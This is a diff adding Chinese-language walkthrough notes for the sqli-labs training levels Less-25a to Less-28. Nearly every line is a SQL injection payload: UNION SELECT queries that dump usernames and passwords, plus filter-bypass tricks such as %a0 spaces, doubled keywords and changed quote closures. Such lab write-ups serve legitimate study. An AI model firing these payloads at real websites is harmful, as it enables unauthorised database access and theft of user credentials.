@@ -976,3 +976,57 @@ $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and passwor
 
 传入`?id=-1' union select 1,(select group_concat(passwoorrd) from users),'3`得到密码
 
+### Less-25a
+
+与Less-25但不用进行闭合
+
+传入`?id=-1 union select 1,(select group_concat(username) from users),3`得到用户名
+
+传入`?id=-1 union select 1,(select group_concat(passwoorrd) from users),3`得到密码
+
+### Less-26
+
+传入`?id=-1////oorr****+++---******1=1`返回`1or1=1`
+
+注释符被过滤,可以使用`%a0`代替
+
+传入`?id=0'%a0oorr%a0'1'='1`正常回显,返回`0'�or�'1'='1`
+
+传入`?id=0'%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),'3`得到用户名
+
+传入`?id=0'%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),'3`得到密码
+
+### Less-26a
+
+闭合方式改为`')`
+
+传入`?id=0')%a0oorr%a0'1'=('1`正常回显,返回`0'�or�'1'='1`
+
+传入`?id=0')%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),('3`得到用户名
+
+传入`?id=0')%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),('3`得到密码
+
+### Less-27
+
+`union`被过滤,使用双写绕过`ununionion`
+
+`select`被过滤,使用双写+大写绕过`selSelectect`
+
+传入`?id=0'%a0or%a0'1'='1`正常回显,返回`0'�or�'1'='1`
+
+传入`?id=0'%a0ununionion%a0seSelectlect%a01,(seSelectlect%a0group_concat(username)%a0from%a0users),'3`得到用户名
+
+传入`?id=0'%a0ununionion%a0seSelectlect%a01,(seSelectlect%a0group_concat(password)%a0from%a0users),'3`得到密码
+
+### Less-27a
+
+闭合方式改为`"`
+
+### Less-28
+
+闭合方式为`')`仅对注释符进行过滤
+
+传入`?id=0')%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),('3`得到用户名
+
+传入`?id=0')%a0union%a0select%a01,(select%a0group_concat(password)%a0from%a0users),('3`得到密码
+
